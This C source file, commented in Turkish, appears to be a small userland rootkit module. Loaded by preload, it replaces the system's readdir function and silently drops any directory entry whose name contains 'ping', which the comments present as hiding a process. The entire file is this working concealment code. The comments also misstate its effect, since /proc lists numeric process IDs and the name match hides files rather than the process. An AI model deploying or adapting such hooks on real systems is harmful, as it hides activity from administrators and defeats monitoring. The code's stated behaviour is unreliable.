#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

// GİZLENECEK İŞLEM ADI
// Test etmek için "ping" komutunu seçtik.
#define SECRET_PROCESS "ping" 

// Orijinal readdir fonksiyonunun adresini tutacak işaretçi (pointer)
static struct dirent *(*original_readdir)(DIR *);

// BİZİM sahte readdir fonksiyonumuz
// Sistem ne zaman "klasörü oku" derse, bu çalışacak.
struct dirent *readdir(DIR *dirp) {
    
    // Eğer orijinal fonksiyonu henüz bulmadıysak, bul ve kaydet.
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *dir_entry;

    // Döngü: Okunan dosya "yasaklı" olduğu sürece bir sonrakine geç
    do {
        // Orijinal fonksiyonu çağırarak sıradaki dosyayı al
        dir_entry = original_readdir(dirp);
        
        // Eğer okunacak dosya kalmadıysa (NULL), döngüden çık
        if (!dir_entry) break;

        // EĞER dosya adı bizim SECRET_PROCESS kelimesini içeriyorsa...
        if (strstr(dir_entry->d_name, SECRET_PROCESS) != NULL) {
            // Bu dosyayı görmezden gel ve döngünün başına dön (sıradakini oku)
            continue; 
        }
        
        // Yasaklı değilse, bu dosyayı sisteme göster
        break;

    } while (1);

    return dir_entry;
}
